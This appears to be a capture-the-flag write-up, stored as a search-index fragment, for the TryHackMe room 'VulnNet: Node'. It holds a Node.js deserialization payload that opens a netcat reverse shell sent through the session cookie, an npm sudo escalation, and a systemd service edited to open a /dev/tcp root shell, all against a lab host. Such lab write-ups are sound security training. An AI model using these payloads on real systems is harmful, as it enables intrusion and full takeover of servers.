found ports.\n  Command: sudo nmap -A -sC -p 8080 -v 10.10.213.208  geobour98@kali:~$ sudo nmap -A -sC -p 8080 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:46 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 10:46 Completed NSE at 10:46, 0.00s elapsed Initiating NSE at 10:46 Completed NSE at 10:46, 0.00s elapsed Initiating NSE at 10:46 Completed NSE at 10:46, 0.00s elapsed Initiating Ping Scan at 10:46 Scanning 10.10.213.208 [4 ports] Completed Ping Scan at 10:46, 0.13s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 10:46 Completed Parallel DNS resolution of 1 host. at 10:46, 0.01s elapsed Initiating SYN Stealth Scan at 10:46 Scanning 10.10.213.208 (10.10.213.208) [1 port] Discovered open port 8080/tcp on 10.10.213.208 Completed SYN Stealth Scan at 10:46, 0.11s elapsed (1 total ports) Initiating Service scan at 10:46 Scanning 1 service on 10.10.213.208 (10.10.213.208) Completed Service scan at 10:46, 7.89s elapsed (1 service on 1 host) Initiating OS detection (try #1) against 10.10.213.208 (10.10.213.208) Retrying OS detection (try #2) against 10.10.213.208 (10.10.213.208) Initiating Traceroute at 10:46 Completed Traceroute at 10:46, 0.07s elapsed Initiating Parallel DNS resolution of 1 host. at 10:46 Completed Parallel DNS resolution of 1 host. at 10:46, 0.00s elapsed NSE: Script scanning 10.10.213.208. Initiating NSE at 10:46 Completed NSE at 10:46, 11.65s elapsed Initiating NSE at 10:46 Completed NSE at 10:47, 2.20s elapsed Initiating NSE at 10:47 Completed NSE at 10:47, 0.00s elapsed Nmap scan report for 10.10.213.208 (10.10.213.208) Host is up (0.072s latency).  PORT STATE SERVICE VERSION 8080/tcp open http Node.js Express framework | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: VulnNet \u0026amp;ndash; Your reliable news source \u0026amp;ndash; Try Now! Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 33.159 days (since Tue Aug 2 06:58:11 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=259 (Good luck!) IP ID Sequence Generation: All zeros  TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 68.75 ms 10.8.0.1 (10.8.0.1) 2 68.81 ms 10.10.213.208 (10.10.213.208)  NSE: Script Post-scanning. Initiating NSE at 10:47 Completed NSE at 10:47, 0.00s elapsed Initiating NSE at 10:47 Completed NSE at 10:47, 0.00s elapsed Initiating NSE at 10:47 Completed NSE at 10:47, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds  Raw packets sent: 59 (4.152KB) | Rcvd: 40 (3.012KB) Navigate to port 8080, click LOGIN NOW, put in the Email field of the login form test@test.com and in the password field test, open Burp Suite and Intercept the request. Then send it to Repeater. The request should look like this:\nGET /login? HTTP/1.1 Host: 10.10.213.208:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://10.10.213.208:8080/login Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D Upgrade-Insecure-Requests: 1 In the Cookie header of the request if we decode the session value from base64 we identify a serialized object.\n  Command: echo -n \u0026quot;eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D\u0026quot; | base64 -d  geobour98@kali:~$ echo -n \u0026#34;eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D\u0026#34; | base64 -d {\u0026#34;username\u0026#34;:\u0026#34;Guest\u0026#34;,\u0026#34;isGuest\u0026#34;:true,\u0026#34;encoding\u0026#34;: \u0026#34;utf-8\u0026#34;} Then, we can send another request modifying the value of the cookie to identify any errors. The request should look like this:\nGET / HTTP/1.1 Host: 10.10.213.208:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://10.10.213.208:8080/login Cookie: session=eyJ1c2VybmFtZSI6Ik Upgrade-Insecure-Requests: 1 The response containing information about unserialize function of Node.js is the following:\nHTTP/1.1 500 Internal Server Error X-Powered-By: Express Content-Security-Policy: default-src \u0026#39;none\u0026#39; X-Content-Type-Options: nosniff Content-Type: text/html; charset=utf-8 Content-Length: 1160 Date: Sun, 04 Sep 2022 08:08:19 GMT Connection: close  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Error\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;pre\u0026gt;SyntaxError: Unexpected end of JSON input\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at JSON.parse (\u0026amp;lt;anonymous\u0026amp;gt;)\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at /home/www/VulnNet-Node/server.js:16:24\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)\u0026lt;br\u0026gt; \u0026amp;nbsp; \u0026amp;nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)\u0026lt;/pre\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Exploitation We can create a serialized object that contains a reverse shell, base64 encode it and then URL encode any special characters. The serialized object should look like this:\n{\u0026#34;username\u0026#34;:\u0026#34;_$$ND_FUNC$$_function (){require(\u0026#39;child_process\u0026#39;).exec(\\\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.8.200.50 443 \u0026gt;/tmp/f\\\u0026#34;, function(error, stdout, stderr) { console.log(stdout) });}()\u0026#34;} Go in Decoder in Burp Suite and put the serialized object. Then click on Encode as and select Base64 so the output should look like this:\neyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9 Before putting the base64 encoded value in the Cookie, URL encode any special characters. In my case, only the + should become %2b. The final request in order to get reverse shell should look like this:\nGET / HTTP/1.1 Host: 10.10.213.208:8080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Referer: http://10.10.213.208:8080/login Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA%2bL3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9 Upgrade-Insecure-Requests: 1 Open a netcat listener and click Send on the Repeater tab and we get a reverse shell as www\ngeobour98@kali:~$ nc -lvnp 443 listening on [any] 443 ... connect to [10.8.200.50] from (UNKNOWN) [10.10.213.208] 58244 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www@vulnnet-node:~/VulnNet-Node$ ^Z zsh: suspended nc -lvnp 443 geobour98@kali:~$ stty raw -echo;fg 1] + continued nc -lvnp 443  www@vulnnet-node:~/VulnNet-Node$ www@vulnnet-node:~/VulnNet-Node$ export TERM=xterm-256color www@vulnnet-node:~/VulnNet-Node$ stty rows 38 cols 111 www@vulnnet-node:~/VulnNet-Node$ whoami www www@vulnnet-node:~/VulnNet-Node$ id uid=1001(www) gid=1001(www) groups=1001(www) The server performed deserialization of the Cookie header so the reverse shell was executed. The payload used can be found in this great article: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/, which is about Node.js deserialization as in our case.\nPrivilege Escalation After executing the command: sudo -l we see that we can execute npm as serv-manage without being asked for password.\nwww@vulnnet-node:~/VulnNet-Node$ sudo -l Matching Defaults entries for www on vulnnet-node:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User www may run the following commands on vulnnet-node:  (serv-manage) NOPASSWD: /usr/bin/npm A great exploit for this can be found on: https://gtfobins.github.io/gtfobins/npm/#sudo\nwww@vulnnet-node:~/VulnNet-Node$ cd /dev/shm www@vulnnet-node:/dev/shm$ echo \u0026#39;{\u0026#34;scripts\u0026#34;: {\u0026#34;preinstall\u0026#34;: \u0026#34;/bin/bash\u0026#34;}}\u0026#39; \u0026gt; /dev/shm/package.json www@vulnnet-node:/dev/shm$ sudo -u serv-manage npm -C /dev/shm/ --unsafe-perm i  \u0026gt; @ preinstall /dev/shm \u0026gt; /bin/bash  serv-manage@vulnnet-node:/dev/shm$ cd /home/serv-manage serv-manage@vulnnet-node:~$ id uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage) serv-manage@vulnnet-node:~$ cat user.txt THM{[REDACTED]} Now we are the user serv-manage. We execute sudo -l and we see that we can start/stop the following systemd timers and reload the systemd manager configuration as root.\nserv-manage@vulnnet-node:~$ sudo -l Matching Defaults entries for serv-manage on vulnnet-node:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User serv-manage may run the following commands on vulnnet-node:  (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer  (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer  (root) NOPASSWD: /bin/systemctl daemon-reload Find where vulnnet-auto.timer is located and open that file.\nserv-manage@vulnnet-node:~$ locate vulnnet-auto.timer /etc/systemd/system/vulnnet-auto.timer serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer [Unit] Description=Run VulnNet utilities every 30 min  [Timer] OnBootSec=0min # 30 min job OnCalendar=*:0/30 Unit=vulnnet-job.service  [Install] WantedBy=basic.target We see that vulnnet-job.service is called so we find where this service is located and open it.\nserv-manage@vulnnet-node:~$ locate vulnnet-job.service /etc/systemd/system/vulnnet-job.service serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service [Unit] Description=Logs system statistics to the systemd journal Wants=vulnnet-auto.timer  [Service] # Gather system statistics Type=forking ExecStart=/bin/df  [Install] WantedBy=multi-user.target First, stop the timer with systemctl, then modify vulnnet-job.service in order to get reverse shell as root, reload the configuration and start the timer again with systemctl.\nserv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service [Unit] Description=Logs system statistics to the systemd journal Wants=vulnnet-auto.timer  [Service] # Gather system statistics Type=forking ExecStart=/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.200.50/444 0\u0026gt;\u0026amp;1\u0026#39;  [Install] WantedBy=multi-user.target serv-manage@vulnnet-node:~$ sudo /bin/systemctl daemon-reload serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer Open another netcat listener on 444 port and we get root reverse shell.\ngeobour98@kali:~$ nc -lvnp 444 listening on [any] 444 ... connect to [10.8.200.50] from (UNKNOWN) [10.10.213.208] 55696 bash: cannot set terminal process group (1119): Inappropriate ioctl for device bash: no job control in this shell root@vulnnet-node:/# cd /root root@vulnnet-node:/root# id uid=0(root) gid=0(root) groups=0(root) root@vulnnet-node:/root# cat root.txt THM{[REDACTED]} Proof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/thm/vulnnetnode/","summary":"üìÜ 10/09/2022 - geobour98 ‚åö 8 min\nIntroduction This is a TryHackMe room which can be found at: VulnNet: Node\nAfter the previous breach, VulnNet Entertainment states it won\u0026rsquo;t happen again. Can you prove they\u0026rsquo;re wrong?\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.213.208  geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:44 EEST Initiating Ping Scan at 10:44 Scanning 10.","title":"TryHackMe - VulnNet: Node"}]